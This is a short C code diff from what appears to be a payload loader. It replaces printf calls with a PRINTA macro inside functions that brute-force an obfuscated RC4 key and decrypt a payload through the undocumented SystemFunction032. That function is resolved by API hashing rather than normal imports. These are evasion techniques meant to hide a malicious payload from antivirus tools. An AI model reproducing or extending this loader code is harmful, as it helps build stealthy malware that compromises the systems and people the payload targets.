@@ -23,7 +23,7 @@ BYTE BruteForceDecryption(IN BYTE HintByte, IN PBYTE pProtectedKey, IN SIZE_T sK
 
 	}
 
-	printf("[i] Calculated 'b' to be : 0x%0.2X \n", b);
+	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
 
 	for (int i = 0; i < sKey; i++) {
 		pRealKey[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
@@ -44,7 +44,7 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 	// brute forcing the key
 	b = BruteForceDecryption(HINT_BYTE, pRc4Key, dwRc4KeySize, &pOriginalKey);
 	if (!b) {
-		printf("[!] BruteForceDecryption Failed To Decrypt The ProtectedKey\n");
+		PRINTA("[!] BruteForceDecryption Failed To Decrypt The ProtectedKey\n");
 		return FALSE;
 	}
 
@@ -67,14 +67,14 @@ BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 	//HMODULE hModule = LoadLibraryA("Advapi32");
 	HMODULE hModule = LoadLibraryA("Cryptsp");
 	if (!hModule) {
-		printf("[!] LoadLibraryA For \"hAdvapi32Dll\"  Failed With Error : 0x % 0.8X\n", GetLastError());
+		PRINTA("[!] LoadLibraryA For \"hAdvapi32Dll\"  Failed With Error : 0x % 0.8X\n", GetLastError());
 		return FALSE;
 	}
 	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressByHashValue(hModule, SystemFunction032HashValue);
 
 	// if SystemFunction032 calls failed it will return non zero value
 	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
-		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
+		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
 		return FALSE;
 	}
 
